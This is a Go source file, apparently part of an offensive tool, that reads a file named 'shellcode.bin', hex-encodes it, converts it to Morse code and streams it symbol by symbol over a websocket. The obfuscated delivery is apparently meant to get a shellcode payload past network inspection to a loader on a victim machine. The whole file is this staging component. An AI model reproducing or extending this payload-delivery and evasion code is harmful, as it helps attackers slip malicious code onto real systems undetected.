package tools

import (
	"encoding/hex"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"os"
	"time"
)

var upgrader = websocket.Upgrader{} // use default options
var morseMap = map[string]string{
	"a": ".-",
	"b": "-...",
	"c": "-.-.",
	"d": "-..",
	"e": ".",
	"f": "..-.",
	"g": "--.",
	"h": "....",
	"i": "..",
	"j": ".---",
	"k": "-.-",
	"l": ".-..",
	"m": "--",
	"n": "-.",
	"o": "---",
	"p": ".--.",
	"q": "--.-",
	"r": ".-.",
	"s": "...",
	"t": "-",
	"u": "..-",
	"v": "...-",
	"w": ".--",
	"x": "-..-",
	"y": "-.--",
	"z": "--..",
	"1": ".----",
	"2": "..---",
	"3": "...--",
	"4": "....-",
	"5": ".....",
	"6": "-....",
	"7": "--...",
	"8": "---..",
	"9": "----.",
	"0": "-----",
}
var pt = "shellcode.bin" //shellcode路径

func MosJa(str string) []string {
	tmp := make([]string, 0)
	for _, value := range []byte(str) {
		tmp = append(tmp, morseMap[string(value)])
	}
	return tmp
}
func read(path string) string {
	content, err := os.ReadFile(path)
	if err != nil {
		log.Fatal(err)
	}
	maxEnLen := hex.EncodedLen(len(content))
	dst1 := make([]byte, maxEnLen)
	hex.Encode(dst1, content)
	return string(dst1)
}
func SocketHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Print("Error during connection upgradation:", err)
		return
	}
	defer conn.Close()

	b := MosJa(read(pt))
	for k := range b {
		time.Sleep(1 * time.Millisecond)
		err = conn.WriteMessage(1, []byte(b[k]))
		if err != nil {
			log.Println("Error during message writing:", err)
			break
		}
	}
}
